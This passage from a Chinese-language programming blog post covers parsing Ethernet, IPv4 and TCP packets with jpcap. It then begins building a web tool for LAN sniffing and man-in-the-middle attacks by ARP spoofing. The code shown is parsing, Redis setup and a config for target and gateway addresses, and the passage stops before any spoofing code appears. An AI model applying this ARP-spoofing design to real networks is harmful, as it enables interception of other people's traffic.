        <span class="k">return</span> <span class="n">protocolName</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setProtocolName</span><span class="o">(</span><span class="nc">String</span> <span class="n">protocolName</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">protocolName</span> <span class="o">=</span> <span class="n">protocolName</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>

</pre></table></code></div></div><p>仍旧以TCP数据包解析为例。假设我们通过setFilter()过滤，然后抓到了一个TCP数据包packet。首先从数据链路层开始分析，下图分别是802标准以及以太网的帧结构。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316183603904.png" alt="image-20210316183603904" /></p><p>在jpcap中，对以太网数据包的封装是<code class="language-plaintext highlighter-rouge">EthernetPacket</code>类，主要内容有以下几项：</p><ol><li>帧类型。标识以太帧处理完成之后将被发送到哪个上层协议进行处理。</li><li>MAC地址。</li></ol><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">dst_mac</span><span class="o">;</span>
<span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">src_mac</span><span class="o">;</span>
<span class="kd">public</span> <span class="kt">short</span> <span class="n">frametype</span><span class="o">;</span>
</pre></table></code></div></div><p>我们就按上面这三个字段解析以太网帧。首先新建一个<code class="language-plaintext highlighter-rouge">Ethernet</code>类表示以太网帧，并继承<code class="language-plaintext highlighter-rouge">AbstractPacket</code>。在其中实现verify方法和parse方法。</p><p>jpcap为我们提供了以太网帧的封装类<code class="language-plaintext highlighter-rouge">EthernetPacket</code>，因此在verify方法中，我们只需判断当前的packet是否属于<code class="language-plaintext highlighter-rouge">EthernetPacket</code>类型即可。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">verify</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">p</span><span class="o">){</span>
  <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="na">datalink</span> <span class="k">instanceof</span> <span class="nc">EthernetPacket</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>在封装类<code class="language-plaintext highlighter-rouge">EthernetPacket</code>中，jpcap提供了若干方法用于访问数据包内容，我们就利用这些方法编写parse方法解析以太网帧：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>	<span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">p</span><span class="o">){</span>
		<span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">parsedData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;();</span>
		<span class="k">if</span><span class="o">(!</span><span class="n">verify</span><span class="o">(</span><span class="n">p</span><span class="o">))</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
		<span class="c1">//获取jpcap封装的数据链路packet</span>
		<span class="n">ethp</span> <span class="o">=</span> <span class="o">(</span><span class="nc">EthernetPacket</span><span class="o">)</span><span class="n">p</span><span class="o">.</span><span class="na">datalink</span><span class="o">;</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Frame Type: "</span><span class="o">+</span><span class="n">ethp</span><span class="o">.</span><span class="na">frametype</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Source MAC Address: "</span><span class="o">+</span><span class="n">ethp</span><span class="o">.</span><span class="na">getSourceAddress</span><span class="o">());</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Destination MAC Address: "</span><span class="o">+</span><span class="n">ethp</span><span class="o">.</span><span class="na">getDestinationAddress</span><span class="o">());</span>
		<span class="k">return</span> <span class="n">parsedData</span><span class="o">;</span>
	<span class="o">}</span>
</pre></table></code></div></div><p>解析结果：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316193523892.png" alt="image-20210316193523892" /></p><p>接下来解析IP包。创建IPv4类，继承<code class="language-plaintext highlighter-rouge">AbstractPacket</code>，同样的思路，用jpcap封装好的<code class="language-plaintext highlighter-rouge">IPPacket</code>实现IPv4数据包的verify和parse方法。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">verify</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">p</span><span class="o">){</span>
  <span class="k">return</span> <span class="n">p</span> <span class="k">instanceof</span> <span class="nc">IPPacket</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="nc">IPPacket</span><span class="o">)</span> <span class="n">p</span><span class="o">).</span><span class="na">version</span> <span class="o">==</span> <span class="mi">4</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">packet</span><span class="o">){</span>
		<span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">parsedData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;();</span>

		<span class="k">if</span><span class="o">(!</span><span class="n">verify</span><span class="o">(</span><span class="n">packet</span><span class="o">))</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
		<span class="kd">final</span> <span class="nc">IPPacket</span> <span class="n">ipv4p</span> <span class="o">=</span> <span class="o">(</span><span class="nc">IPPacket</span><span class="o">)</span><span class="n">packet</span><span class="o">;</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Version: 4"</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Priority: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">priority</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Throughput: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">t_flag</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Reliability: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">r_flag</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Length: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">length</span><span class="o">);</span><span class="c1">//数据报长度，单位是字节</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Identification: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">ident</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Don't Fragment: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">dont_frag</span><span class="o">);</span><span class="c1">//不对数据报进行分片</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"More Fragment: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">more_frag</span><span class="o">);</span><span class="c1">//除了最后一片外，其他每个组成数据报的片都要把该比特置1。 </span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Fragment Offset: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">offset</span><span class="o">);</span><span class="c1">//数据报的偏移量</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Time To Live: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">hop_limit</span><span class="o">);</span><span class="c1">//TTL</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Protocol: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">protocol</span><span class="o">);</span><span class="c1">//协议字段</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Source IP: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">src_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">());</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Destination IP: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">dst_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">());</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Source Host Name: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">src_ip</span><span class="o">.</span><span class="na">getHostName</span><span class="o">());</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Destination Host Name: "</span><span class="o">+</span><span class="n">ipv4p</span><span class="o">.</span><span class="na">dst_ip</span><span class="o">.</span><span class="na">getHostName</span><span class="o">());</span>
		<span class="k">return</span> <span class="n">parsedData</span><span class="o">;</span>
	<span class="o">}</span>
</pre></table></code></div></div><p>IP数据报的内容众多，结构如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316192859961.png" alt="image-20210316192859961" /></p><p>解析结果：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316193546007.png" alt="image-20210316193546007" /></p><p>最后解析TCP报文段。jpcap对TCP报文段的封装类是<code class="language-plaintext highlighter-rouge">TCPPacket</code>，TCP报文段结构如下所示：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316194225746.png" alt="image-20210316194225746" /></p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">verify</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">p</span><span class="o">){</span>
		<span class="k">return</span> <span class="n">p</span> <span class="k">instanceof</span> <span class="nc">TCPPacket</span><span class="o">;</span>
	<span class="o">}</span>
	
	<span class="kd">public</span> <span class="nc">String</span> <span class="nf">getProtocolName</span><span class="o">(){</span>
		<span class="k">return</span> <span class="s">"TCP"</span><span class="o">;</span>
	<span class="o">}</span>
	
	<span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">p</span><span class="o">){</span>
		<span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">parsedData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;();</span>

		<span class="k">if</span><span class="o">(!</span><span class="n">verify</span><span class="o">(</span><span class="n">p</span><span class="o">))</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>

		<span class="nc">TCPPacket</span> <span class="n">tcp</span> <span class="o">=</span> <span class="o">(</span><span class="nc">TCPPacket</span><span class="o">)</span><span class="n">p</span><span class="o">;</span>

		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Source Port: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">src_port</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Destination Port: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">dst_port</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Sequence Number: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">sequence</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Ack Number: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">ack_num</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"URG Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">urg</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"ACK Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">ack</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"PSH Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">psh</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"RST Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">rst</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"SYN Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">syn</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"FIN Flag: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">fin</span><span class="o">);</span>
		<span class="n">parsedData</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Window Size: "</span><span class="o">+</span><span class="n">tcp</span><span class="o">.</span><span class="na">window</span><span class="o">);</span>

		<span class="k">return</span> <span class="n">parsedData</span><span class="o">;</span>
	<span class="o">}</span>
</pre></table></code></div></div><p>TCP报文段应该非常熟悉了，不再解释。解析结果如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316194333948.png" alt="image-20210316194333948" /></p><p>至此一个TCP报文段解析完毕。</p><p>再按同样的方法编写ARP、IPv6、UDP、HTTP等常见协议，就能基本实现抓包和解析功能。</p><h2 id="5-局域网数据嗅探">5. 局域网数据嗅探</h2><p>大致了解了JPCAP的使用方式后，我打算参考<a href="https://github.com/hustakin/jpcap-mitm">项目</a>开发基于局域网嗅探实现点对点MITM攻击的WEB项目（前后端分离），实现：</p><ol><li>局域网ARP Spoofing；</li><li>嗅探指定终端的上/下行链路数据包；</li><li>数据包内容分析及前端可视化。</li></ol><p>前端我直接采用了该项目的前端模块（Angular6 + Echarts），此项目实现了前后端分离，因此我只需要编写后端模块为前端接口提供JSON数据即可，该前端模块的接口调用方式如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210323210343382.png" alt="image-20210323210343382" /></p><h3 id="51-替换dao">5.1 替换Dao</h3><p>该<a href="https://github.com/hustakin/jpcap-mitm">项目</a>采用MongoDB作为数据存储引擎，我将其更换成了Redis。如果我们使用默认的<code class="language-plaintext highlighter-rouge">Redis</code>配置，由于springboot只提供了<code class="language-plaintext highlighter-rouge">RedisTemplate&lt;Object, Object&gt;</code>和<code class="language-plaintext highlighter-rouge">StringRedisTemplate</code>两种模版，因此只支持<code class="language-plaintext highlighter-rouge">string</code>类型的序列化器。但是我们需要将对象序列化到redis中，所以需要自定义<code class="language-plaintext highlighter-rouge">redisTemplate</code>，并配置序列化器。</p><p>在Springboot 2.x中将默认的Redis客户端更换为<code class="language-plaintext highlighter-rouge">lettuce</code>，因此在配置<code class="language-plaintext highlighter-rouge">redis</code>的时候需要格外注意。<code class="language-plaintext highlighter-rouge">lettuce</code>的自定义方式与<code class="language-plaintext highlighter-rouge">jedis</code>有些不同，首先在<code class="language-plaintext highlighter-rouge">config</code>包下创建<code class="language-plaintext highlighter-rouge">RedisConfig</code>类，该类需继承<code class="language-plaintext highlighter-rouge">CachingConfigurerSupport</code>类。然后编写方法注入Bean到IOC容器中：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cm">/**
 * 实例化 RedisTemplate 对象
 *
 * @return
 */</span>
<span class="nd">@Bean</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">"redisTemplate"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">RedisTemplate</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="nf">redisTemplate</span><span class="o">(</span><span class="nc">RedisConnectionFactory</span> <span class="n">redisConnectionFactory</span><span class="o">)</span> <span class="o">{</span>
  <span class="nc">RedisTemplate</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">redisTemplate</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">RedisTemplate</span><span class="o">&lt;&gt;();</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">setConnectionFactory</span><span class="o">(</span><span class="n">redisConnectionFactory</span><span class="o">);</span>
  <span class="c1">//配置序列化方式</span>
  <span class="c1">//JSON序列化配置</span>
  <span class="nc">Jackson2JsonRedisSerializer</span> <span class="n">jackson2JsonRedisSerializer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Jackson2JsonRedisSerializer</span><span class="o">(</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">setKeySerializer</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringRedisSerializer</span><span class="o">());</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">setHashKeySerializer</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringRedisSerializer</span><span class="o">());</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">setHashValueSerializer</span><span class="o">(</span><span class="k">new</span> <span class="nc">GenericJackson2JsonRedisSerializer</span><span class="o">());</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">setValueSerializer</span><span class="o">(</span><span class="n">jackson2JsonRedisSerializer</span><span class="o">);</span><span class="c1">//设置value的序列化器为jackson，这样能够保证对象被成功序列化</span>
  <span class="n">redisTemplate</span><span class="o">.</span><span class="na">afterPropertiesSet</span><span class="o">();</span>
  <span class="k">return</span> <span class="n">redisTemplate</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p><strong>需要注意的是：被序列化的类需要实现<code class="language-plaintext highlighter-rouge">Serializable</code>接口。</strong></p><p>完成以上步骤就能直接通过IOC容器获取自定义的<code class="language-plaintext highlighter-rouge">redisTemplate</code>模版了。我们将其封装到<code class="language-plaintext highlighter-rouge">RedisMapper</code>类中，统一处理<code class="language-plaintext highlighter-rouge">dao</code>的各种操作。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
</pre><td class="rouge-code"><pre><span class="cm">/**
 * @author kol Huang
 * @date 2021/3/22
 */</span>
<span class="nd">@Component</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RedisMapper</span> <span class="o">{</span>

    <span class="nd">@Resource</span>
    <span class="nd">@Qualifier</span><span class="o">(</span><span class="s">"redisTemplate"</span><span class="o">)</span>
    <span class="kd">private</span> <span class="nc">RedisTemplate</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">redisTemplate</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setRedisTemplate</span><span class="o">(</span><span class="nc">RedisTemplate</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">redisTemplate</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">redisTemplate</span> <span class="o">=</span> <span class="n">redisTemplate</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**
     * 普通缓存获取
     * @param key 键
     * @return 值
     */</span>
    <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">get</span><span class="o">(</span><span class="nc">KeyPrefix</span> <span class="n">prefix</span><span class="o">,</span> <span class="nc">String</span> <span class="n">key</span><span class="o">){</span>
        <span class="nc">String</span> <span class="n">realKey</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">redisTemplate</span><span class="o">.</span><span class="na">opsForValue</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="cm">/**
     * 普通缓存放入
     * @param key 键
     * @param value 值
     * @return true成功 false失败
     */</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">set</span><span class="o">(</span><span class="nc">KeyPrefix</span> <span class="n">prefix</span><span class="o">,</span> <span class="nc">String</span> <span class="n">key</span><span class="o">,</span><span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">realKey</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
            <span class="n">redisTemplate</span><span class="o">.</span><span class="na">opsForValue</span><span class="o">().</span><span class="na">set</span><span class="o">(</span><span class="n">realKey</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>

    <span class="o">}</span>

    <span class="cm">/**
     * 普通缓存放入并设置时间
     * @param key 键
     * @param value 值
     * @param time 时间(秒) time要大于0 如果time小于等于0 将设置无限期
     * @return true成功 false 失败
     */</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">set</span><span class="o">(</span><span class="nc">KeyPrefix</span> <span class="n">prefix</span><span class="o">,</span> <span class="nc">String</span> <span class="n">key</span><span class="o">,</span><span class="nc">Object</span> <span class="n">value</span><span class="o">,</span><span class="kt">long</span> <span class="n">time</span><span class="o">){</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">time</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
                <span class="nc">String</span> <span class="n">realKey</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
                <span class="n">redisTemplate</span><span class="o">.</span><span class="na">opsForValue</span><span class="o">().</span><span class="na">set</span><span class="o">(</span><span class="n">realKey</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">time</span><span class="o">,</span> <span class="nc">TimeUnit</span><span class="o">.</span><span class="na">SECONDS</span><span class="o">);</span>
            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
                <span class="n">set</span><span class="o">(</span><span class="n">prefix</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="cm">/**
     * 删除缓存
     * @param key 可以传一个值或多个
     */</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">del</span><span class="o">(</span><span class="nc">KeyPrefix</span> <span class="n">prefix</span><span class="o">,</span> <span class="nc">String</span> <span class="o">...</span> <span class="n">key</span><span class="o">){</span>
        <span class="k">if</span><span class="o">(</span><span class="n">key</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">key</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
            <span class="k">if</span><span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
                <span class="nc">String</span> <span class="n">realKey</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">key</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
                <span class="n">redisTemplate</span><span class="o">.</span><span class="na">delete</span><span class="o">(</span><span class="n">realKey</span><span class="o">);</span>
            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
                <span class="c1">//加前缀</span>
                <span class="nc">Collection</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">keys</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
                <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">s</span> <span class="o">:</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">keys</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">s</span><span class="o">));</span>
                <span class="o">}</span>
                <span class="n">redisTemplate</span><span class="o">.</span><span class="na">delete</span><span class="o">(</span><span class="n">keys</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

<span class="o">}</span>

</pre></table></code></div></div><h3 id="52-attackconfig">5.2 AttackConfig</h3><p>由于ARP spoof的需求，我们需要获取到以下信息：</p><ul><li>本地IP/MAC地址</li><li>目标IP/MAC地址</li><li>网关IP/MAC地址</li></ul><p>因此我们将以上信息封装到一个配置类中，即<code class="language-plaintext highlighter-rouge">AttackConfig</code>。这些配置信息中的<code class="language-plaintext highlighter-rouge">本地IP/MAC地址</code>信息可以在web项目初始化的时候就自动从设备上获取，因此我们在<code class="language-plaintext highlighter-rouge">AttackService</code>类（位于<code class="language-plaintext highlighter-rouge">service</code>层）中编写初始化方法：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nd">@PostConstruct</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">initDefaultConfig</span><span class="o">(){</span>
  <span class="k">this</span><span class="o">.</span><span class="na">initDeviceList</span><span class="o">();</span>

